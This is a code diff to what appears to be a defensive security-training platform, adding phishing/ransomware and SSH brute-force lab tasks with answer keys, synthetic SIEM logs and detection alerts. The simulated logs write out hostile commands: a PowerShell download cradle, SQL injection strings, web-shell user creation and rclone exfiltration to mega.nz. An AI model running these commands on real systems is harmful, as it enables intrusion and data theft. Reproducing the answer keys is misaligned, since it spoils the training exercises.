@@ -3,6 +3,7 @@ import random
 from datetime import timedelta
 from pathlib import Path
 from core import now
+from labs_data import NEW_LABS
 
 
 def L(id, title, content, video="", minutes=10, resources=None):
@@ -181,12 +182,18 @@ PHISH_FS = {
 PHISH_LAB = {
     "id": "lab-phish-ransom", "title": "Phishing to Ransomware", "difficulty": "Intermediate", "duration": "60 min", "published": True,
     "description": "A finance user opened a malicious invoice. Two hours later the file server started encrypting. Reconstruct the kill chain from email to encryption.",
+    "category": "Ransomware",
+    "scenario": "09:40 — the helpdesk escalates a call: files on \\\\FS-01\\shares are being renamed to .lockd and a README_RESTORE.txt appeared. Finance reported a strange invoice email this morning. You are the on-shift L2. Evidence from the mail gateway, proxy, Windows logs and a password dump is in ~/evidence.",
+    "report_guide": "Cover: initial access, payload, C2, lateral movement, impact, IOCs, and containment/recovery steps.",
+    "report_keywords": ["phishing", "macro", "powershell", "185.220.101.45", "cdn-update.top", "svch0st.exe", "fs-01", "isolate", "backup", "reset"],
     "tasks": [
-        {"id": "t1", "title": "Initial access", "question": "What is the sending IP (X-Originating-IP) of the phishing email?", "answer": "91.243.44.10", "hint": "cat ~/evidence/email.eml"},
-        {"id": "t2", "title": "Payload", "question": "Decode the macro's base64. Which IP hosted stage2?", "answer": "185.220.101.45", "hint": "base64 -d the -enc string, or use the Decoder tool"},
-        {"id": "t3", "title": "Command & control", "question": "Which domain received regular beacons?", "answer": "cdn-update.top", "hint": "grep POST ~/evidence/proxy.log"},
-        {"id": "t4", "title": "Impact", "question": "Which binary performed the encryption on FS-01?", "answer": "svch0st.exe", "hint": "grep FS-01 ~/evidence/security.log"},
-        {"id": "t5", "title": "Credentials", "question": "Crack backup_admin's MD5 hash. What is the password?", "answer": "password", "hint": "john ~/evidence/hashes.txt"},
+        {"id": "t1", "phase": "Initial Access", "title": "Sender IP", "question": "What is the sending IP (X-Originating-IP) of the phishing email?", "answer": "91.243.44.10", "hint": "cat ~/evidence/email.eml"},
+        {"id": "t1b", "phase": "Initial Access", "type": "mcq", "title": "Lure type", "question": "Which ATT&CK technique best describes the initial access?", "options": ["T1566.001 Spearphishing Attachment", "T1190 Exploit Public-Facing Application", "T1078 Valid Accounts", "T1133 External Remote Services"], "answer": "T1566.001 Spearphishing Attachment", "hint": "The email carried a .docm invoice"},
+        {"id": "t2", "phase": "Execution & C2", "title": "Payload", "question": "Decode the macro's base64. Which IP hosted stage2?", "answer": "185.220.101.45", "hint": "base64 -d the -enc string, or use the Decoder tool"},
+        {"id": "t3", "phase": "Execution & C2", "title": "Command & control", "question": "Which domain received regular beacons?", "answer": "cdn-update.top", "hint": "grep POST ~/evidence/proxy.log"},
+        {"id": "t4", "phase": "Impact", "title": "Encryptor", "question": "Which binary performed the encryption on FS-01?", "answer": "svch0st.exe", "hint": "grep FS-01 ~/evidence/security.log"},
+        {"id": "t5", "phase": "Impact", "title": "Credentials", "question": "Crack backup_admin's MD5 hash. What is the password?", "answer": "password", "hint": "john ~/evidence/hashes.txt"},
+        {"id": "t6", "phase": "Response", "type": "mcq", "title": "First containment move", "question": "Encryption is still running on FS-01. What do you do first?", "options": ["Isolate FS-01 and FIN-WS-07 from the network via EDR", "Power off every server immediately", "Email the attacker to negotiate", "Wait for the backup job tonight"], "answer": "Isolate FS-01 and FIN-WS-07 from the network via EDR", "hint": "Keep memory evidence, stop the spread"},
     ],
     "kali": {
         "fs": PHISH_FS,
@@ -206,10 +213,16 @@ PHISH_LAB = {
 BRUTE_LAB = {
     "id": "lab-bruteforce", "title": "Linux SSH Brute Force", "difficulty": "Beginner", "duration": "30 min", "published": True,
     "description": "A public jump host shows thousands of SSH failures. Determine the attacker, whether they got in, and what they did.",
+    "category": "Brute Force",
+    "scenario": "Monitoring flagged 18 SSH failures in under a minute on the public jump host, followed by silence. Silence after a burst is never good news. Work out who attacked, whether they got in and what they left behind.",
+    "report_guide": "Cover: attacker IP, targeted accounts, the successful login, persistence, and response (block, key removal, password reset).",
+    "report_keywords": ["45.155.205.12", "brute force", "deploy", "accepted", "authorized_keys", "block", "reset", "mfa"],
     "tasks": [
-        {"id": "t1", "title": "Attacker", "question": "Which IP generated the most failed passwords?", "answer": "45.155.205.12", "hint": "grep Failed ~/auth.log"},
-        {"id": "t2", "title": "Success?", "question": "Which username was successfully compromised?", "answer": "deploy", "hint": "grep Accepted ~/auth.log"},
-        {"id": "t3", "title": "Persistence", "question": "What file did the attacker modify for persistence? (full path)", "answer": "/home/deploy/.ssh/authorized_keys", "hint": "cat ~/bash_history_deploy"},
+        {"id": "t1", "phase": "Detection", "title": "Attacker", "question": "Which IP generated the most failed passwords?", "answer": "45.155.205.12", "hint": "grep Failed ~/auth.log"},
+        {"id": "t1b", "phase": "Detection", "type": "mcq", "title": "Pattern", "question": "One IP tried root, admin, deploy and ubuntu repeatedly. What is this?", "options": ["Brute force / dictionary attack", "Password spray across thousands of tenants", "Pass-the-hash", "Kerberoasting"], "answer": "Brute force / dictionary attack", "hint": "Same source, few accounts, many tries"},
+        {"id": "t2", "phase": "Investigation", "title": "Success?", "question": "Which username was successfully compromised?", "answer": "deploy", "hint": "grep Accepted ~/auth.log"},
+        {"id": "t3", "phase": "Investigation", "title": "Persistence", "question": "What file did the attacker modify for persistence? (full path)", "answer": "/home/deploy/.ssh/authorized_keys", "hint": "cat ~/bash_history_deploy"},
+        {"id": "t4", "phase": "Response", "type": "mcq", "title": "Response", "question": "Which response fully removes the attacker's access?", "options": ["Remove the attacker key from authorized_keys, reset deploy's password and block the IP", "Only block the IP", "Only reset the password", "Reboot the jump host"], "answer": "Remove the attacker key from authorized_keys, reset deploy's password and block the IP", "hint": "They have a password AND a key"},
     ],
     "kali": {"fs": {
         "/home/analyst/auth.log": "\n".join([f"Jun 08 03:1{i%10}:0{i%10} jump sshd[90{i}]: Failed password for {u} from 45.155.205.12 port 5{i}11 ssh2" for i, u in enumerate(["root", "admin", "deploy", "root", "ubuntu", "deploy"] * 3)]) +
@@ -220,7 +233,7 @@ BRUTE_LAB = {
         "pcap": "No capture loaded.", "cracked": {}},
 }
 
-LABS = [PHISH_LAB, BRUTE_LAB]
+LABS = [PHISH_LAB, BRUTE_LAB] + NEW_LABS
 
 INTEL = {
     "185.220.101.45": {"type": "ip", "verdict": "malicious", "detections": "12/90", "tags": ["c2", "tor-exit", "malware-hosting"], "country": "DE", "asn": "AS60729", "first_seen": "2025-11-02"},
@@ -293,6 +306,48 @@ def gen_logs():
     add(lm + 9, sourcetype="wineventlog", host="DC-01", user="h.lee", event_id=7045, action="success", message="Service PSEXESVC installed")
     add(lm + 12, sourcetype="wineventlog", host="DC-01", user="h.lee", event_id=4720, action="success", message="User account support01 created")
     add(lm + 14, sourcetype="wineventlog", host="DC-01", user="h.lee", event_id=1102, action="success", message="The audit log was cleared")
+    for i in range(420):
+        m = rnd.randint(0, 6 * 1440)
+        u, h = rnd.choice(users), rnd.choice(hosts[:4])
+        k = rnd.choice(["sysmon", "azuread", "web", "fw2", "win2"])
+        if k == "sysmon":
+            p = rnd.choice([("chrome.exe", "explorer.exe"), ("outlook.exe", "explorer.exe"), ("teams.exe", "explorer.exe"), ("svchost.exe", "services.exe"), ("powershell.exe", "ccmexec.exe")])
+            add(m, sourcetype="sysmon", host=h, user=u, event_id=1, process=p[0], parent_process=p[1], command_line=f"C:\\Program Files\\{p[0]}", action="success", message="Process create")
+        elif k == "azuread":
+            add(m, sourcetype="azuread", host="ENTRA-ID", user=f"{u}@acme-corp.com", src_ip=f"49.36.{rnd.randint(1, 50)}.{rnd.randint(2, 250)}", country="IN", app=rnd.choice(["Outlook", "Teams", "SharePoint"]), action="success", message="Sign-in success")
+        elif k == "web":
+            add(m, sourcetype="web", host="WEB-01", src_ip=f"{rnd.randint(11, 220)}.{rnd.randint(0, 255)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}", method="GET", uri=rnd.choice(["/", "/products.aspx", "/login.aspx", "/css/site.css"]), status=rnd.choice([200, 200, 200, 304, 404]), user_agent="Mozilla/5.0", action="allow", message="HTTP request")
+        elif k == "fw2":
+            add(m, sourcetype="firewall", host="FW-EDGE", src_ip=f"10.0.4.{rnd.randint(10, 60)}", dest_ip=rnd.choice(["13.107.42.14", "142.250.183.14", "151.101.1.69"]), dest_port=443, bytes_out=rnd.randint(2000, 900000), action="allow", message="Outbound connection")
+        else:
+            add(m, sourcetype="wineventlog", host=h, user=u, event_id=rnd.choice([4624, 4634, 4672]), logon_type=rnd.choice([2, 3, 11]), action="success", message="An account was successfully logged on")
+    sp = 4 * 1440 + 70
+    for i, u in enumerate(users * 5):
+        add(sp + i * 0.2, sourcetype="azuread", host="ENTRA-ID", user=f"{u}@acme-corp.com", src_ip="102.89.34.11", country="NG", app="Exchange ActiveSync", result_code=50126, action="failure", message="Invalid username or password")
+    add(sp + 9, sourcetype="azuread", host="ENTRA-ID", user="m.shah@acme-corp.com", src_ip="102.89.34.11", country="NG", app="Exchange ActiveSync", action="success", message="Sign-in success (legacy auth, MFA not required)")
+    add(sp + 12, sourcetype="o365", host="EXCHANGE", user="m.shah@acme-corp.com", src_ip="102.89.34.11", operation="New-InboxRule", action="success", message="Inbox rule: move from *suppliers* to RSS Feeds, mark read")
+    add(sp + 430, sourcetype="azuread", host="ENTRA-ID", user="m.shah@acme-corp.com", src_ip="49.36.12.8", country="IN", app="Outlook", action="success", message="Sign-in success (impossible travel from NG)")
+    kr = 2 * 1440 + 134
+    for i, s in enumerate(["svc_sql", "svc_backup", "svc_web", "svc_sharepoint", "svc_crm", "svc_print"]):
+        add(kr + i * 0.05, sourcetype="wineventlog", host="DC-01", user="s.chen", src_ip="10.0.4.33", event_id=4769, service=s, ticket_encryption="0x17", action="success", message=f"Kerberos service ticket requested for {s} (RC4)")
+    add(kr + 30, sourcetype="wineventlog", host="DC-01", user="svc_sql", src_ip="10.0.4.33", event_id=4624, logon_type=3, action="success", message="Service account logon from workstation WS-HR-03")
+    add(kr + 33, sourcetype="sysmon", host="WS-MKT-11", user="s.chen", event_id=10, process="C:\\Users\\Public\\m.exe", target_process="lsass.exe", action="success", message="Process accessed lsass.exe (GrantedAccess 0x1010)")
+    ps = 1 * 1440 + 900
+    add(ps, sourcetype="sysmon", host="WS-HR-03", user="a.kumar", event_id=1, process="powershell.exe", parent_process="winword.exe", command_line="powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://45.95.169.22/a.ps1')", action="success", message="Office spawned PowerShell download cradle")
+    add(ps + 0.5, sourcetype="wineventlog", host="WS-HR-03", user="a.kumar", event_id=4104, script_block="IEX (New-Object Net.WebClient).DownloadString('http://45.95.169.22/a.ps1')", action="success", message="PowerShell script block logged")
+    add(ps + 1, sourcetype="firewall", host="FW-EDGE", src_ip="10.0.4.29", dest_ip="45.95.169.22", dest_port=80, bytes_out=3100, action="allow", message="Outbound HTTP to rare IP")
+    dt = 3 * 1440 + 1320
+    for i in range(60):
+        add(dt + i * 0.3, sourcetype="dns", host="IT-SRV-02", src_ip="10.0.0.12", query=f"a2RieC1jaHVuay0w{i:04d}.{i:04d}.exfil-tunnel.xyz", record_type="TXT", action="resolved", message="DNS TXT query long subdomain")
+    wb = 4 * 1440 + 780
+    for i, (meth, uri, q, st, ua) in enumerate([("GET", "/products.aspx", "id=7", 200, "sqlmap/1.8#stable"), ("GET", "/products.aspx", "id=7' UNION SELECT NULL,username,password FROM users--", 200, "sqlmap/1.8#stable"),
+                                               ("GET", "/products.aspx", "id=7' OR 1=1--", 500, "sqlmap/1.8#stable"), ("POST", "/admin/upload.aspx", "", 200, "Mozilla/5.0"),
+                                               ("GET", "/uploads/help.aspx", "cmd=whoami", 200, "Mozilla/5.0"), ("GET", "/uploads/help.aspx", "cmd=net user iis_svc2 Pa55! /add", 200, "Mozilla/5.0")]):
+        add(wb + i * 1.5, sourcetype="web", host="WEB-01", src_ip="193.32.162.77", method=meth, uri=uri, uri_query=q, status=st, user_agent=ua, action="allow", message="HTTP request")
+    add(wb + 7, sourcetype="sysmon", host="WEB-01", user="iis apppool\\portal", event_id=1, process="cmd.exe", parent_process="w3wp.exe", command_line="cmd.exe /c whoami", action="success", message="Web server spawned shell")
+    ex = 5 * 1440 + 1380
+    add(ex, sourcetype="sysmon", host="FS-01", user="backup_admin", event_id=1, process="rclone.exe", parent_process="cmd.exe", command_line="rclone.exe copy \\\\FS-01\\finance mega:dump --config rc.conf", action="success", message="Exfil tool execution")
+    add(ex + 20, sourcetype="firewall", host="FW-EDGE", src_ip="10.0.0.21", dest_ip="31.216.148.12", dest_port=443, bytes_out=2150000000, action="allow", message="Large outbound transfer to mega.nz")
     for i, e in enumerate(sorted(out, key=lambda x: x["_time"])):
         e["id"] = f"evt-{i:04d}"
     return sorted(out, key=lambda x: x["_time"])
@@ -303,6 +358,10 @@ SIEM_ALERTS = [
     {"id": "al-2", "name": "Shadow copy deletion", "query": "vssadmin", "threshold": 1, "severity": "Critical"},
     {"id": "al-3", "name": "Audit log cleared", "query": "event_id=1102", "threshold": 1, "severity": "High"},
     {"id": "al-4", "name": "Beacon to newly registered domain", "query": "sourcetype=dns query=cdn-update.top", "threshold": 3, "severity": "Medium"},
+    {"id": "al-5", "name": "Password spray against Entra ID", "query": "sourcetype=azuread result_code=50126", "threshold": 20, "severity": "High"},
+    {"id": "al-6", "name": "Kerberoasting (RC4 service tickets)", "query": "event_id=4769 ticket_encryption=0x17", "threshold": 5, "severity": "High"},
+    {"id": "al-7", "name": "Web server spawning shell", "query": "parent_process=w3wp.exe", "threshold": 1, "severity": "Critical"},
+    {"id": "al-8", "name": "DNS tunneling (TXT to one domain)", "query": "record_type=TXT query=*exfil-tunnel.xyz", "threshold": 30, "severity": "High"},
 ]
 
 
